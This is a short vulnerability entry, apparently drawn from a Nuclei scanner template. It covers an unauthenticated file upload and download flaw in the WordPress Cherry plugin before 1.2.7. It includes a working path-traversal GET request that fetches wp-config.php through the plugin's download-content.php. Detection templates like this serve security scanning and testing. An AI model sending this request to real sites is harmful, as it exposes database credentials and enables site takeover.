# Vulnerability: WordPress Cherry < 1.2.7 - Unauthenticated Arbitrary File Upload and Download
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`cherry-lfi.yaml`)

## Description
WordPress plugin Cherry < 1.2.7 has a vulnerability which enables an attacker to upload files directly to the server. This could result in attacker uploading backdoor shell scripts or downloading the wp-config.php file.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php
```

